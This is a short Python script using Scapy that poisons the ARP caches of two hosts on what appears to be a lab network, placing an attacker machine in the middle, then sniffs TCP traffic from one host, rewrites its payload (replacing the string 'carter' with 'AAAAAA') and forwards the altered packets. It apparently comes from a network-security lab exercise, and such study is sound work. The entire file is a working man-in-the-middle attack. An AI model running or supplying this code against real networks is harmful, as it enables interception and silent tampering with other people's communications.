#!/usr/bin/python3
from scapy.all import *
from multiprocessing import Process
import time

targetA_IP = "10.9.0.5"
targetA_MAC = "02:42:0a:09:00:05"

targetB_IP = "10.9.0.6"
targetB_MAC = "02:42:0a:09:00:06"

m_IP = "10.9.0.105"
m_MAC = "02:42:0a:09:00:69"



def frame_sender(frame, frame2):
    while(True):
        sendp(frame)
        sendp(frame2)
        time.sleep(2)

    
def poison_cache(target_IP, poison_IP, target_MAC, poison_MAC):
    e = Ether()
    e.src = poison_MAC
    e.dst = target_MAC

    arp = ARP()
    arp.psrc = poison_IP
    arp.hwsrc = poison_MAC
    arp.pdst = target_IP
    arp.op = 1

    frame = e/arp

    return frame


def spoof_pkt(pkt):
    if pkt[IP].src == targetA_IP and pkt[IP].dst == targetB_IP: 

        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            newdata = data.replace(b'carter', b'AAAAAA')
            d_length = len(data)
            print(f"{data}, length: {d_length}")
        

            newpkt = newpkt/newdata
            time.sleep(1)
            print(f"replace with {newdata}")

        send(newpkt)

    elif pkt[IP].src == targetB_IP and pkt[IP].dst == targetA_IP:
        print("elif111!")
        newpkt = pkt[IP]
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        print("sending thru..")
        send(newpkt)

    else:
        print("oopappapa")

def sniffer(aiface, filt, aprn):
    pkt = sniff(iface=aiface, filter=filt, prn=aprn)


frame = poison_cache(targetA_IP, targetB_IP, targetA_MAC, m_MAC)
frame2 = poison_cache(targetB_IP, targetA_IP, targetB_MAC, m_MAC)
p0 = Process(target=frame_sender, args=([frame, frame2]))
p0.start()
f = 'tcp and not ((host 10.9.0.105) or (ether src host 02:42:0a:09:00:69))'
p1 = Process(target=sniffer,args=("eth0", f, spoof_pkt))
p1.start()


